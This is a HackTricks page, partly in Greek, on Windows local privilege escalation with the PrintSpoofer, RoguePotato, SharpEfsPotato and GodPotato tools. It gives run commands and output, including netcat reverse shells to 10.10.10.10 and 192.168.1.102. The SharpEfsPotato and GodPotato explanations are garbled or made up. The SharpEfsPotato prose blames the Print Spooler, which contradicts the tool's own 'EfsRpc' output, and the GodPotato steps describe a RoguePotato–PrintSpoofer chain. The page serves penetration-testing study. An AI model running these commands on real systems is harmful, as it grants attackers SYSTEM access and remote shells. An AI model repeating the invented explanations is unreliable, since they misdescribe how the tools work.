# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

{% hint style="warning" %}
Το **JuicyPotato δεν λειτουργεί** στα Windows Server 2019 και στα Windows 10 build 1809 και μεταγενέστερα. Ωστόσο, τα [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) μπορούν να χρησιμοποιηθούν για να **εκμεταλλευτούν τα ίδια προνόμια και να αποκτήσουν πρόσβαση σε επίπεδο `NT AUTHORITY\SYSTEM`**. Αυτή η [ανάρτηση στο blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) παρέχει λεπτομερείς πληροφορίες για το εργαλείο `PrintSpoofer`, το οποίο μπορεί να χρησιμοποιηθεί για την κατάχρηση των προνομίων υποκατάστασης σε υπολογιστές με Windows 10 και Server 2019, όπου το JuicyPotato δεν λειτουργεί πλέον.
{% endhint %}

## Γρήγορη επίδειξη

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
### RoguePotato

{% code overflow="wrap" %}
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

Το SharpEfsPotato είναι ένα εργαλείο που εκμεταλλεύεται τον τρόπο με τον οποίο το Windows επιτρέπει την εκτέλεση κακόβουλου κώδικα με αυξημένα δικαιώματα. Αυτό το εργαλείο χρησιμοποιεί την ευπάθεια του Print Spooler service για να εκτελέσει κώδικα με δικαιώματα συστήματος.

Για να χρησιμοποιήσετε το SharpEfsPotato, ακολουθήστε τα παρακάτω βήματα:

1. Κατεβάστε τον κώδικα του SharpEfsPotato από το αποθετήριο του GitHub.
2. Ανοίξτε ένα παράθυρο εντολών και μεταβείτε στον φάκελο όπου κατεβάσατε τον κώδικα.
3. Εκτελέστε την εντολή `SharpEfsPotato.exe`.
4. Αν η εκτέλεση είναι επιτυχής, θα λάβετε ένα κέλυφος με δικαιώματα συστήματος.

Πρέπει να σημειωθεί ότι το SharpEfsPotato είναι ένα εργαλείο που χρησιμοποιείται για εκπαιδευτικούς και δοκιμαστικούς σκοπούς και δεν πρέπει να χρησιμοποιείται για παράνομες δραστηριότητες.

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

The GodPotato technique is a local privilege escalation attack that takes advantage of the Print Spooler service in Windows. It combines the RoguePotato and PrintSpoofer exploits to gain SYSTEM-level privileges on the target system.

To execute the GodPotato attack, follow these steps:

1. Download the RoguePotato exploit from the GitHub repository.
2. Compile the exploit using Visual Studio or any other C# compiler.
3. Run the compiled RoguePotato executable on the target system.
4. The RoguePotato exploit will create a malicious RPC endpoint on the target system.
5. Download the PrintSpoofer exploit from the GitHub repository.
6. Compile the exploit using Visual Studio or any other C++ compiler.
7. Run the compiled PrintSpoofer executable on the target system.
8. The PrintSpoofer exploit will impersonate the SYSTEM account and connect to the malicious RPC endpoint created by RoguePotato.
9. Once connected, the PrintSpoofer exploit will execute arbitrary code with SYSTEM privileges.

By combining these two exploits, the GodPotato attack allows an attacker to escalate their privileges from a low-privileged user to the highest level of access on the target system. It is important to note that this attack requires local access to the target system and may not work on all Windows versions.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
## Αναφορές
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
